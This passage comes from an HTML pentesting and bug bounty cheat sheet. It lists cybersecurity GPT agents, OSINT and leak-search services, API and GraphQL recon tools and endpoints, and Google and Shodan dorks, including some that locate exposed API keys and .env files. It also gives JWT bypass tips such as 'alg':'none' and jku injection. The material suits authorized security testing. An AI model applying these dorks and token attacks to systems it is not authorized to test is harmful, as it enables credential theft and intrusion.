			<li>Microsoft's IIS - <code>c:\inetpub\wwwroot</code></li>
		</ul>
</ol>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 


<h2 align='center' id='n7'><em>GPTs (Agents) for Cybersecurity </em></h2>
<ul>
	<li><a href='https://chat.openai.com/g/g-U5ZnmObzh-magicunprotect'>MagicUnprotect</a> - allows interacting with the Unprotect knowledge base on malware evasion techniques</li>
	<li><a href='https://chat.openai.com/g/g-Vy4rIqiCF-threat-intel-bot'>Threat Intel Bot</a> - GPT agent for retrieving the latest data on APT groups</li>
	<li><a href='https://chat.openai.com/g/g-RfQI5RmAX-hacker-news-gpt'>Hacker News GPT</a> - summarizes the most relevant and discussed Hacker News articles</li>
	<li><a href='https://chat.openai.com/g/g-fCIE7hCLx-att-ck-mate'>ATT&CK Mate</a> - get any answer about the ATT&CK knowledge base</li>
	<li><a href='https://chat.openai.com/g/g-VRtUR3Jpv-smart-contract-auditor'>Smart Contract Audit Assistant</a> - a high-precision tool for auditing smart contracts</li>
	<li><a href='https://chat.openai.com/g/g-0p2l975AN-alphahoundai'>AlphaHoundAI</a> - expert in BloodHound CE, Cypher, SharpHound, and related tools</li>
	<li><a href='https://chat.openai.com/g/g-UKY6elM2U-zkgpt'>zkGPT</a> - if you want to master cryptography, use this agent</li>
	<li><a href='https://chat.openai.com/g/g-Ep6YFTwsn-osistent'>OSISTent</a> - will assist you in solving various OSINT tasks and research</li>
	<li><a href='https://chat.openai.com/g/g-hnDH58fct-bug-bounty-assistant'>Bug Bounty Assistant</a> - a guide for web application security</li>
	<li><a href='https://github.com/Awesome-GPT-Agents'>Full List</a></li> 
</ul>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 

<h2 align='center' id='n8'><em>OSINT</em></h2>
<ol>
	<li> Tools for searching data by email and logins
		<p> <a href='https://snusbase.com/'>Snusbase</a> indexes information from leaks and provides access to searching compromised email addresses, logins, names, IP addresses, phone numbers, and password hashes
		<p> <a href='https://haveibeenpwned.com/'>Have I Been Pwned?</a> is a data breach search engine. It allows you to check which incidents a specific email address has been involved in
		<p> <a href='https://hunter.io/'>Hunter</a> and <a href='http://www.skymem.info/'>Skymem</a> - search for corporate email addresses by URL
		<p> <a href='https://whatsmyname.app/'>Whatsmyname</a> - searches for accounts on various services by username. The service is based on <a href='https://github.com/WebBreacher/WhatsMyName'>publicly available JSON</a>
		<p> <a href='https://www.user-searcher.com/'>User Searcher</a> - a free tool that helps find users by login on over 2,000 websites
		<p> <a href='https://checkusernames.com/'>CheckUserNames</a>, <a href='https://instantusername.com/#/'>Instant</a>, <a href='https://www.namecheckr.com/'>Namecheckr</a>, <a 							href='https://www.peekyou.com/username'>Peekyou</a>, <a href='https://usersearch.org/'>Usersearch</a> - online services for searching user accounts by username
</ol>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 

<h2 align='center' id='n9'><em>API</em></h2>
	<ol>
		<li><a href='#n9.1'>Tools</a>
		<li><a href='#n9.2'>Tips</a>
		<li><a href='#n9.3'>GraphQL</a>
		<!--<li>REST API - in progress-->
	</ol>
 	<h3 id='n9.1'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tools</ins></h3>
  	<ul>
		<li>Burp Extensions - <a href='https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f'>Autorize</a>, <a href='https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943'>Param Miner</a></li>
		<li><a href='https://www.postman.com/downloads/'>Postman</a>. Like Burp but for API requests</li>
		<li><a href='https://github.com/ticarpi/jwt_tool'>JWT_Tool</a></li>
		<li><a href='https://github.com/assetnote/kiterunner'>Kiterunner</a></li>
		<li><a href='https://github.com/s0md3v/Arjun'>Arjun</a>. For params fuzzing</li>
		<li><a href='https://addons.mozilla.org/en-US/firefox/addon/rested/'>Rested</a> (FireFox extension) - Quick request sender. Usefull with API</li>
	</ul>
	<h3 id='n9.2'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tips ←</ins></h3>
			<ol>
				<li>Wordlists:</li>
					<p><code>seclists/Discovery/Web-Content/api/</code></p>
					<p><code>seclists/Discovery/Web-Content/api/objects.txt</code></p>
					<p><code>seclists/Discovery/Web-Content/api/actions.txt</code></p>
					<p><code>seclists/Discovery/Web-Content/swagger.txt</code></p>
					<p><code>seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt</code></p>
				<li>Try to:</li>
					<ul>
						<li>Check the JS files to find api endpoints</li>
						<li>Change methods</li>
						<li>If BFLA doesn`t allow to see one record, try to get all (/users instead of /user/1)</li>
						<li>Check numbers of version (for example v0, v1, v2, v3, v4 etc)</li>
						<li>Fuzz parameters and/or query</li>
						<li>Remove Bearer from Authorization header (<code>Authorization: &lt;JWT></code>)
					</ul>
				<li>Endpoints:</li>
					<ul>
						<li>https://target.domain/api</li>
						<li>https://target.domain/v1, https://target.domain/v2 etc</li>
						<li>https://target.domain/api/v1, https://target.domain/api/v2 etc</li>
						<li>https://target.domain/swagger</li>
						<li>https://target.domain/docs</li>
						<li>https://target.domain/rest</li>
						<li>https://api.target.domain</li>
						<li>https://target.com/docs</li>
						<li>https://dev.target.com/rest</li>
						<li>https://dev.target.com/playground</li>
						<li>https://dev.target.com/altair</li>
					</ul>
				<li>Google Dorking:</li>
					<ul>
						<li><code>inurl:/api/admin site:target.com</code></li>
						<li><code>inurl:"/wp-json/wp/v2/users"</code> - Finds all publicly available WordPress API user directories</li>
						<li><code>intitle:"index of" intext:"api"</code></li>
						<li><code>intitle:"index.of" intext:"api.txt"</code> - Finds publicly available API key files</li>
						<li><code>inurl:"/api/*" intext:"index of"</code> - Finds potentially interesting API directories</li>
						<li><code>ext:php inurl:"api.php?action="</code> - Finds all sites with a XenAPI SQL injection vulnerability</li>
						<li><code>intext:api filetype:env</code></li>
						<li><code>intitle:"index of" api_key OR "api key" OR apiKey -pool</code> - It lists potentially exposed API keys</li>
						<li><code>intext:APIKey ext:js | xml | yaml | txt | conf | py intitle:"index of"</code></li>
						<li><code>intitle:"index of" "api.yaml"</code></li>
						<li><code>"api" ext:log</code></li>
					</ul>
				<li>Git Dorking:</li>
					<ul>
						<li>filename:swagger.json</li>
						<li>extension: .json</li>
						<li>searching “api key,” "api keys", "apikey", "authorization: Bearer", "access_token", "secret", or “token.”</li>
					</ul>
				<li>Shodan:</li>
					<ul>
						<li><code>port:80,443 http.status:200 "Content-Type: application/json"</code></li>
						<li><code>"Content-Type: application/xml"</code> - Find web servers returning potential endpoints that use XML (ie: SOAP)</li>
						<li><code>"Content-Type: application/json"</code> - Find web servers returning potential endpoints that use JSON</li>
						<li><code>"wp-json"</code> - This will search for web applications using the WordPress API</li>
						<li><code>"X-*API*" hostname:"*.target.domain"</code> - Find servers that contain custom headers related to “API”. ie: X-API-KEY, X-API-VERSION, X-API-ENV, X-AMZ-API-PATH etc</li>
						<li><code>ssl.cert.subject.cn:target.domain</code> - Find servers who have been issued an SSL cert for *.target.domain</li>
						<li><code>ssl:"&lt;Company Name"></code> - Find servers who have been issued an SSL cert relating to the company you are targeting. Useful for certs generated by SaaS/cloud vendors offering services to the target (ie: AWS, Azure, Google, etc). This typically finds stuff in the Issued To organization fields.</li>
					</ul>
				<li>Some resources:</li>
					<ul>
						<li><a href='https://www.postman.com/explore/apis'>Postman Explore</a></li>
						<li><a href='https://www.programmableweb.com/apis/directory'>ProgrammableWeb API Directory</a></li>
						<li><a href='https://apis.guru/'>APIs Guru</a></li>
						<li><a href='https://github.com/public-apis/public-apis'>Public APIs Github Project</a></li>
						<li><a href='https://rapidapi.com/search/'>RapidAPI Hub</a></li>
					</ul>
			</ol>
	<h3 id='n9.3'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GraphQL</ins></h3>
 		<ol>
			<li>Tools</li>
				<ul>
					<li>Altair GraphQL Client (<a href='https://altairgraphql.dev/'>desktop</a>, <a href='https://addons.mozilla.org/en-US/firefox/search/?q=altair'>FireFox</a>, <a href='https://chromewebstore.google.com/detail/altair-graphql-client/flnheeellpciglgpaodhkhmapeljopja?hl=en'>Chrome</a>)</li>
					<li><a href='https://github.com/nikitastupin/clairvoyance'>Clairvoyance</a>. Obtain GraphQL API schema even if the introspection is disabled</li>
					<li>InQL (<a href='https://github.com/doyensec/inql'>github</a>, <a href='https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f'>burp</a>) - GraphQL Scanner</li>
					<li><a href='https://github.com/dolevf/graphw00f'>graphw00f</a> - GraphQL Server Fingerprinting</li>
					<li><a href='https://github.com/assetnote/batchql'>BatchQL</a> - security auditing script</li>
					<li><a href='https://gitlab.com/dee-see/graphql-path-enum/-/releases/'>graphql-path-enum</a> is a tool that lists the different ways of reaching a given type in a GraphQL schema</li>
					<li><a href='https://github.com/dolevf/graphql-cop'>GraphQL Cop</a> is a small Python utility to run common security tests against GraphQL APIs</li>
					<li><a href='https://github.com/nicholasaleks/CrackQL'>CrackQL</a> is a versatile GraphQL penetration testing tool that exploits poor rate-limit and cost analysis controls to brute-force credentials and fuzz operations</li>
					<li><a href='https://graphql-kit.com/graphql-voyager/'>graphql-voyager</a> ← upload introspection and see schema</li>
					<li><a href='https://github.com/dolevf/nmap-graphql-introspection-nse'>nmap-graphql-introspection-nse</a></li>
				</ul>
			<li>Wordlists:</li> 
				<ul>
					<li><code>/usr/share/wordlists/seclists/Discovery/Web-Content/api/</code></li>
					<li><a href='https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch04/common-graphql-endpoints.txt'>common-graphql-endpoints.txt</a></li>
					<li><a href='https://github.com/dolevf/Black-Hat-GraphQL/blob/master/resources/non-production-graphql-urls.txt'>non-production-graphql-urls.txt</a></li>
				</ul>
			<li>Request -> To Repeater -> right-click > GraphQL > Set introspection query. To insert an introspection query into the request body to see much more about GraphQL tree data and manipulate</li>
			<li>Endpoints:</li>
				<ul>
					<li>/graphql</li>
					<li>/graphiql</li>
					<li>/api</li>
					<li>/api/graphql</li>
					<li>/graphql/api</li>
					<li>/graphql?debug=1</li>
					<li>/graphql/graphql</li>
					<li>If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path</li>
				</ul>
		</ol>

					
<h3 align='right'><a href='#start'> <-- Back </a></h3> 

<h2 align='center' id='n10'><em>WordPress</em></h2>
	<ul>
		<li>Endpoints:
			<p>wp-json/wp/v2/users
	</ul>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 

<h2 align='center' id='n11'><em>JWT</em></h2>
	Some tips:
 		<ul>
			<li>Great tool for work with JWT - <a href='https://github.com/ticarpi/jwt_tool'>JWT_Tool</a>
			<li>Try easy change params
			<li>Check delete all or delete a couple of chars of signature and send a response
			<li>Try to brute force signature key
			<li>Send a response without signature and set "alg":"none"(or None, or nOne, or NONE). Try send with and without second dot.
			<li>Try to use JWK if alg is asymmetric encryption (RS256, ES256 etc)
			<li>If there is a jku, try to put yourself url with a key
		</ul>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 

<h2 align='center' id='n12'><em>Toolkit</em></h2>
<ol>
	<li>CLI</li>
	<ul>
		<li>nmap</li>
		<li>massdns</li>
		<li>shufflesdns</li>
		<li>subfinder</li>
		<li>amass</li>
		<li>assetfinder</li>
		<li>waybackurls</li>
		<li>httpx</li>
		<li>sara</li>
		<li>katana</li>
		<li>ffuf</li>
		<li>gobuster</li>
	</ul>
	<li>Browser Extensions</li>
	<ul>
		<li>Foxy Proxy</li>
		<li>Wappalyzer</li>
		<li>WaybackURL</li>
		<li>Header Editor</li>
		<li>Cookie-Editor</li>
		<li>User-Agent Switcher and Manager</li>
		<li>Altair GraphQL Client</li>
		<li>RESTED</li>
		<li>Hack-Tools</li>
		<li>Max HacKBar</li>
		<li>OWASP Penetration Testing Kit</li>
		<li>Beautifer & Minify</li>
		<li>Shodan</li>
		<li>.DotGit</li>
		<li>FireFox Multi-Account Containers</li>
		<li>KnoXSS</li>
		<li>Retire.js</li>
	</ul>
	<li>Burp Extensions</li>
	<ul>
		<li>Autorize</li>
		<li>Arartha</li>
		<li>InQL</li>
		<li>JWT Editor</li>	
	</ul>
	<li>Another tools</li>
	<ul>
		<li>Postman</li>
		<li>Shodan</li>
		<li>Censys</li>
		<li>crt.sh</li>
	</ul>
</ol>

<h3 align='right'><a href='#start'> <-- Back </a></h3> 



</body>
